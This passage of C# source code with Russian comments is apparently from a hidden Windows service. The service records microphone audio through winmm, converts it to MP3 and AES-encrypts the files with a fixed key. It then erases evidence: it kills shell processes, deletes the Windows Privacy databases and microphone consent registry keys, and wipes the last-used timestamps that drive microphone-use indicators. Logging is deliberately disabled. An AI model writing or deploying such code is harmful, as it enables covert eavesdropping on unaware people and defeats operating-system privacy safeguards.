                {
                Log($"Начало сохранения MP3 файла: {fileName}");
                
                // Проверяем, что данные не пустые
                if (dataLength == 0 || pcmData == null || pcmData.Length == 0)
                {
                    throw new InvalidOperationException("Нет данных для сохранения в MP3");
                }

                // Создаем временный WAV файл в памяти
                using (var memoryStream = new MemoryStream())
                using (var waveWriter = new BinaryWriter(memoryStream))
                {
                    // Записываем WAV заголовок
                    waveWriter.Write(Encoding.ASCII.GetBytes("RIFF"));
                    waveWriter.Write(36 + dataLength);
                    waveWriter.Write(Encoding.ASCII.GetBytes("WAVE"));
                    waveWriter.Write(Encoding.ASCII.GetBytes("fmt "));
                    waveWriter.Write(16);
                    waveWriter.Write((short)1);
                    waveWriter.Write((short)format.nChannels);
                    waveWriter.Write(format.nSamplesPerSec);
                    waveWriter.Write(format.nAvgBytesPerSec);
                    waveWriter.Write((short)format.nBlockAlign);
                    waveWriter.Write((short)format.wBitsPerSample);
                    waveWriter.Write(Encoding.ASCII.GetBytes("data"));
                    waveWriter.Write(dataLength);
                    waveWriter.Write(pcmData, 0, (int)dataLength);

                    // Сбрасываем позицию потока
                    memoryStream.Position = 0;

                    // Конвертируем в MP3
                    WaveFileReader? wavReader = null;
                    LameMP3FileWriter? mp3Writer = null;
                            try
                            {
                        wavReader = new WaveFileReader(memoryStream);
                        Log($"WaveFileReader создан, формат: {wavReader.WaveFormat.SampleRate}Hz, {wavReader.WaveFormat.BitsPerSample}bit, {wavReader.WaveFormat.Channels}ch");
                        
                        // Используем формат из WAV файла (WaveFileReader правильно его читает)
                        mp3Writer = new LameMP3FileWriter(fileName, wavReader.WaveFormat, DEFAULT_MP3_PRESET);
                        Log($"LameMP3FileWriter создан для файла: {fileName}");
                        
                        wavReader.CopyTo(mp3Writer);
                        mp3Writer.Flush(); // Принудительно записываем буфер
                        Log($"Данные скопированы в MP3 (исходный размер: {dataLength} байт)");
                    }
                    finally
                    {
                        // Явно закрываем потоки
                        try
                        {
                            mp3Writer?.Dispose();
                            Log("LameMP3FileWriter закрыт");
                            }
                            catch (Exception ex)
                            {
                            Log($"Ошибка при закрытии MP3 writer: {ex.Message}");
                            }
                        
                        try
                        {
                            wavReader?.Dispose();
                            Log("WaveFileReader закрыт");
                        }
                        catch (Exception ex)
                        {
                            Log($"Ошибка при закрытии WAV reader: {ex.Message}");
                        }
                    }
                }

                // Проверяем, что файл создан и не пустой (после закрытия всех потоков)
                Thread.Sleep(100); // Даём время файловой системе обновить информацию
                FileInfo fileInfo = new FileInfo(fileName);
                if (!fileInfo.Exists)
                {
                    throw new InvalidOperationException("MP3 файл не был создан");
                }
                
                if (fileInfo.Length == 0)
                {
                    File.Delete(fileName);
                    throw new InvalidOperationException("MP3 файл создан, но пуст (размер: 0 байт)");
                }

                double sizeMB = fileInfo.Length / (1024.0 * 1024.0);
                Log($"MP3 файл успешно сохранен: {fileName} (размер: {sizeMB:F2} MB)");
                }
            catch (Exception ex)
            {
                Log($"Ошибка сохранения MP3: {ex.GetType().Name}: {ex.Message}");
                if (ex.InnerException != null)
                {
                    Log($"Внутренняя ошибка: {ex.InnerException.GetType().Name}: {ex.InnerException.Message}");
                }
                Log($"StackTrace: {ex.StackTrace}");
                
                // Ждём немного, чтобы потоки закрылись
                Thread.Sleep(200);
                
                // Удаляем пустой или поврежденный MP3 файл
                try
                {
                    if (File.Exists(fileName))
                    {
                        FileInfo fileInfo = new FileInfo(fileName);
                        Log($"Попытка удалить MP3 файл: {fileName}, размер: {fileInfo.Length} байт");
                        
                        // Пробуем несколько раз удалить файл
                        for (int i = 0; i < 5; i++)
            {
                try
                {
                                File.Delete(fileName);
                                Log($"MP3 файл успешно удален (попытка {i + 1})");
                        break;
                    }
                            catch (IOException ioEx)
                            {
                                if (i < 4)
                                {
                                    Log($"Файл заблокирован, ждём... (попытка {i + 1}/5)");
                                    Thread.Sleep(300);
                                }
                                else
                    {
                                    Log($"Не удалось удалить MP3 файл после 5 попыток: {ioEx.Message}");
                                }
                            }
                        }
                    }
                }
                catch (Exception deleteEx)
                {
                    Log($"Ошибка при удалении MP3 файла: {deleteEx.GetType().Name}: {deleteEx.Message}");
                }
                
                // Пробрасываем исключение - не создаём WAV файл
                throw;
            }
        }

        /// <summary>
        /// Запускает фоновое шифрование готового MP3-файла с удалением оригинала.
        /// На выходе остаётся только зашифрованный файл без расширения.
        /// В начале файла сохраняется оригинальное имя файла (зашифрованное).
        /// </summary>
        /// <param name="sourceFilePath">Путь к исходному MP3-файлу.</param>
        /// <param name="originalFileName">Оригинальное имя файла (без расширения) для сохранения в метаданных.</param>
        private void StartBackgroundEncryption(string sourceFilePath, string originalFileName)
        {
            try
            {
                // Запускаем отдельный фоновый поток, чтобы не задерживать основной цикл записи.
                Task.Run(() =>
                {
                    try
                    {
                        // Ждём, чтобы убедиться, что файл полностью записан
                        int retryCount = 0;
                        while (retryCount < 20)
                        {
                            if (File.Exists(sourceFilePath))
                            {
                                FileInfo fileInfo = new FileInfo(sourceFilePath);
                                if (fileInfo.Length > 0)
                                {
                                    Log($"Файл готов к шифрованию: {sourceFilePath}, размер: {fileInfo.Length} байт");
                        break;
                                }
                            }
                        Thread.Sleep(100);
                            retryCount++;
                        }
                        
                        if (!File.Exists(sourceFilePath))
                        {
                            Log($"ОШИБКА: Файл не найден для шифрования: {sourceFilePath}");
                            return;
                        }

                        FileInfo finalFileInfo = new FileInfo(sourceFilePath);
                        if (finalFileInfo.Length == 0)
                        {
                            Log($"ОШИБКА: Файл пустой, шифрование отменено: {sourceFilePath}");
                            return;
                        }

                        Log($"Начало шифрования содержимого файла: {sourceFilePath}");

                        // Читаем исходный файл в память
                        byte[] sourceData;
                        using (var input = new FileStream(sourceFilePath, FileMode.Open, FileAccess.Read, FileShare.Read))
                        {
                            sourceData = new byte[input.Length];
                            input.Read(sourceData, 0, sourceData.Length);
                            Log($"Прочитан исходный файл, размер: {sourceData.Length} байт");
                        }
                        
                        // Шифруем данные
                        byte[] encryptedData;
                        using (var aes = Aes.Create())
                        {
                            if (aes == null)
                            {
                                Log($"ОШИБКА: Не удалось создать AES объект");
                                return;
                            }

                            aes.Key = EncryptionKey;
                            aes.IV = EncryptionIV;
                            aes.Mode = CipherMode.CBC;
                            aes.Padding = PaddingMode.PKCS7;

                            using (var encryptor = aes.CreateEncryptor())
                            using (var msEncrypt = new MemoryStream())
                            {
                                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                                {
                                    csEncrypt.Write(sourceData, 0, sourceData.Length);
                                    csEncrypt.FlushFinalBlock();
                                }
                                encryptedData = msEncrypt.ToArray();
                            }
                        }
                        
                        Log($"Данные зашифрованы, размер: {encryptedData.Length} байт (исходный: {sourceData.Length} байт)");
                        
                        // Перезаписываем исходный файл зашифрованными данными
                        try
                        {
                            // Удаляем исходный файл
                            if (File.Exists(sourceFilePath))
                            {
                                int deleteRetry = 0;
                                while (deleteRetry < 5)
                                {
                                    try
                                    {
                                        File.Delete(sourceFilePath);
                                        Log($"Исходный файл удалён: {sourceFilePath}");
                    break;
                }
                                    catch (Exception delEx)
                                    {
                                        deleteRetry++;
                                        if (deleteRetry >= 5)
                                        {
                                            throw new Exception($"Не удалось удалить исходный файл после {deleteRetry} попыток: {delEx.Message}");
                                        }
                                        Thread.Sleep(200);
                                    }
                                }
                            }
                            
                            // Записываем зашифрованные данные в исходный файл
                            using (var output = new FileStream(sourceFilePath, FileMode.Create, FileAccess.Write, FileShare.None))
                            {
                                output.Write(encryptedData, 0, encryptedData.Length);
                                output.Flush(true);
                            }
                            
                            FileInfo finalInfo = new FileInfo(sourceFilePath);
                            Log($"Файл успешно зашифрован: {sourceFilePath}, размер: {finalInfo.Length} байт");
                        }
                        catch (Exception ex)
                        {
                            Log($"ОШИБКА при перезаписи файла: {ex.GetType().Name}: {ex.Message}");
                            Log($"StackTrace: {ex.StackTrace}");
                        }

                }
                catch (Exception ex)
                {
                        // Любые ошибки шифрования не должны ломать работу сервиса.
                        Log($"Ошибка при шифровании файла: {ex.Message}");
                    }
                });
            }
            catch
            {
                // Игнорируем ошибки запуска фоновой задачи.
                    }
                }

        /// <summary>
        /// Сохраняет оригинальное имя файла в начале файла (для файлов без шифрования содержимого)
        /// Имя шифруется для единообразия с зашифрованными файлами
        /// </summary>
        private void SaveOriginalFileNameToFile(string filePath, string originalFileName)
        {
            try
            {
                // Читаем содержимое файла
                byte[] fileContent = File.ReadAllBytes(filePath);
                
                // Шифруем имя для метаданных (как в зашифрованных файлах)
                using (var aes = Aes.Create())
                {
                    if (aes == null)
                    return;

                    aes.Key = EncryptionKey;
                    aes.IV = EncryptionIV;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    byte[] nameBytes = System.Text.Encoding.UTF8.GetBytes(originalFileName);
                    byte[] nameLengthBytes = BitConverter.GetBytes(nameBytes.Length);
                    
                    // Шифруем имя
                    using (var nameEncryptor = aes.CreateEncryptor())
                    {
                        byte[] encryptedName = nameEncryptor.TransformFinalBlock(nameBytes, 0, nameBytes.Length);
                        
                        // Создаём новый файл: метаданные (зашифрованное имя) + оригинальное содержимое
                        using (var output = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None))
                        {
                            // Записываем метаданные: длина зашифрованного имени + зашифрованное имя
                            output.Write(nameLengthBytes, 0, 4);
                            output.Write(encryptedName, 0, encryptedName.Length);
                            
                            // Записываем оригинальное содержимое (не зашифрованное)
                            output.Write(fileContent, 0, fileContent.Length);
                        }
                    }
                }
                
                Log($"Оригинальное имя сохранено в файле (зашифровано): {originalFileName}");
            }
            catch (Exception ex)
            {
                Log($"Ошибка при сохранении оригинального имени в файл: {ex.Message}");
                // Не критично - продолжаем работу
            }
        }

        private void ExecuteCompleteCleanup()
        {
            Log("=== ВЫПОЛНЕНИЕ ПОЛНОЙ ОЧИСТКИ КАК В BAT-ФАЙЛЕ ===");

            try
            {
                // 1. Убиваем процессы, которые держат кеш
                Log("Остановка процессов...");
                Process.Start(new ProcessStartInfo
                {
                    FileName = "taskkill",
                    Arguments = "/f /im \"ShellExperienceHost.exe\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(1000);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "taskkill",
                    Arguments = "/f /im \"StartMenuExperienceHost.exe\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(500);

                Thread.Sleep(500);

                // 2. Удаляем файлы приватности
                Log("Удаление файлов приватности...");
                DeletePrivacyFilesLikeBat();

                // 3. Полная очистка реестра
                Log("Очистка реестра...");
                CleanRegistryLikeBat();

                // 4. Удаляем кэш времени использования
                Log("Очистка кэша времени...");
                ClearTimeCacheLikeBat();

                // 5. Обновляем системные параметры
                Log("Обновление системных параметры...");
                UpdateSystemParametersLikeBat();

                Log("=== ОЧИСТКА ЗАВЕРШЕНА УСПЕШНО ===");
            }
            catch (Exception ex)
            {
                Log($"Ошибка при очистке: {ex.Message}");
            }
        }

        private void DeletePrivacyFilesLikeBat()
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string privacyPath = Path.Combine(localAppData, @"Microsoft\Windows\Privacy");

                string[] filesToDelete = {
                    "PrivacyExperience.dat",
                    "PrivacyExperience.dat-shm",
                    "PrivacyExperience.dat-wal"
                };

                foreach (string file in filesToDelete)
                {
                    try
                    {
                        string fullPath = Path.Combine(privacyPath, file);
                        if (File.Exists(fullPath))
                    {
                            File.Delete(fullPath);
                            Log($"Файл приватности удален: {file}");
                        }
                        else
                        {
                            Log($"Файл не найден: {file}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Ошибка удаления файла {file}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка при удалении файлов приватности: {ex.Message}");
                    }
                }

        private void CleanRegistryLikeBat()
        {
            try
            {
                // ТОЧНО КАК В BAT-ФАЙЛЕ - полное удаление разделов
                string[] registryPathsToDelete = {
                    @"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
                    @"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged"
                };

                // Удаляем разделы в HKCU
                foreach (string path in registryPathsToDelete)
                {
                    try
                    {
                        using (RegistryKey? key = Registry.CurrentUser.OpenSubKey("", true))
                {
                            if (key != null)
                            {
                                key.DeleteSubKeyTree(path, false);
                                Log($"Удален раздел реестра: HKCU\\{path}");
                }
                            else
                            {
                                Log($"Не удалось открыть корневой раздел HKCU для удаления: {path}");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Ошибка удаления HKCU\\{path}: {ex.Message}");
            }
                }

                // Удаляем раздел в HKLM (как в bat)
                try
                {
                    string hklmPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone";
                    using (RegistryKey? key = Registry.LocalMachine.OpenSubKey("", true))
                    {
                        if (key != null)
                        {
                            key.DeleteSubKeyTree(hklmPath, false);
                            Log($"Удален раздел реестра: HKLM\\{hklmPath}");
                        }
                        else
                        {
                            Log($"Не удалось открыть корневой раздел HKLM для удаления: {hklmPath}");
                }
                    }
            }
            catch (Exception ex)
            {
                    Log($"Ошибка удаления HKLM раздела: {ex.Message}");
                }
            }
            catch (Exception ex)
                {
                Log($"Ошибка при очистке реестра: {ex.Message}");
            }
        }

        private void ClearTimeCacheLikeBat()
        {
            try
            {
                // ТОЧНО КАК В BAT-ФАЙЛЕ - перебираем все ключи и удаляем значения времени
                string registryPath = @"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged";

                using (RegistryKey? baseKey = Registry.CurrentUser.OpenSubKey(registryPath, false))
                {
                    if (baseKey == null)
                    {
                        Log($"Раздел для очистки времени не найден: {registryPath}");
                        return;
                    }

                    string[] subKeyNames = baseKey.GetSubKeyNames();
                    foreach (string subKeyName in subKeyNames)
            {
                try
                {
                            string fullPath = $"{registryPath}\\{subKeyName}";
                            using (RegistryKey? subKey = Registry.CurrentUser.OpenSubKey(fullPath, true))
                            {
                                if (subKey != null)
                                {
                                    // Удаляем значения времени как в bat
                                    string[] timeValues = { "LastUsedTimeStart", "LastUsedTimeStop" };
                                    foreach (string valueName in timeValues)
                                    {
                                        if (subKey.GetValue(valueName) != null)
                                        {
                                            subKey.DeleteValue(valueName);
                                            Log($"Удалено значение времени: {subKeyName}\\{valueName}");
                                        }
                                    }
                                }
                                else
                                {
                                    Log($"Не удалось открыть раздел реестра для очистки времени: {fullPath}");
                                }
                            }
            }
            catch (Exception ex)
            {
                            Log($"Ошибка очистки времени для {subKeyName}: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Ошибка при очистке кэша времени: {ex.Message}");
            }
        }

        private void UpdateSystemParametersLikeBat()
        {
            try
            {
                // ТОЧНО КАК В BAT-ФАЙЛЕ - используем rundll32
                Process.Start(new ProcessStartInfo
                {
                    FileName = "rundll32.exe",
                    Arguments = "user32.dll,UpdatePerUserSystemParameters",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                })?.WaitForExit(3000);

                Log("Системные параметры обновлены");
            }
            catch (Exception ex)
            {
                Log($"Ошибка при обновлении системных параметров: {ex.Message}");
                    }
                }

        private void Log(string message)
        {
            // Логирование отключено по требованию:
            // - не пишем в файлы
            // - не выводим в консоль
            // Оставляем метод пустым, чтобы не трогать остальные вызовы Log(...)
        }

        public override void Dispose()
        {
            Log("=== DISPOSE - ЗАВЕРШЕНИЕ РАБОТЫ СЕРВИСА ===");

            // Отписываемся от событий
            SystemEvents.SessionEnding -= OnSessionEnding;
            SystemEvents.PowerModeChanged -= OnPowerModeChanged;

            // Выполняем финальную очистку
            ExecuteShutdownCleanup();

            _globalCts?.Cancel();
            _globalCts?.Dispose();

            Log("=== СЕРВИС ПОЛНОСТЬЮ ОСТАНОВЛЕН ===");
            base.Dispose();
        }

        // WinAPI делегаты и структуры
        [DllImport("winmm.dll")]
        private static extern uint waveInOpen(out IntPtr hWaveIn, uint uDeviceID, ref WaveFormat lpFormat,
            IntPtr dwCallback, IntPtr dwInstance, uint dwFlags);

        [DllImport("winmm.dll")]
        private static extern uint waveInClose(IntPtr hWaveIn);

        [DllImport("winmm.dll")]
        private static extern uint waveInPrepareHeader(IntPtr hWaveIn, ref WaveHdr lpWaveInHdr, uint uSize);

        [DllImport("winmm.dll")]
        private static extern uint waveInUnprepareHeader(IntPtr hWaveIn, ref WaveHdr lpWaveInHdr, uint uSize);

        [DllImport("winmm.dll")]
        private static extern uint waveInAddBuffer(IntPtr hWaveIn, ref WaveHdr lpWaveInHdr, uint uSize);

        [DllImport("winmm.dll")]
        private static extern uint waveInStart(IntPtr hWaveIn);

        [DllImport("winmm.dll")]
        private static extern uint waveInStop(IntPtr hWaveIn);

        [DllImport("winmm.dll")]
        private static extern uint waveInReset(IntPtr hWaveIn);

        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
        private static extern uint waveInGetErrorText(uint mmrError, StringBuilder pszText, uint cchText);

        private const uint WHDR_DONE = 0x00000001;

        [StructLayout(LayoutKind.Sequential)]
        private struct WaveFormat
        {
            public ushort wFormatTag;
            public ushort nChannels;
            public uint nSamplesPerSec;
            public uint nAvgBytesPerSec;
            public ushort nBlockAlign;
            public ushort wBitsPerSample;
            public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct WaveHdr
        {
            public IntPtr lpData;
            public uint dwBufferLength;
            public uint dwBytesRecorded;
            public IntPtr dwUser;
            public uint dwFlags;
            public uint dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }
    }
}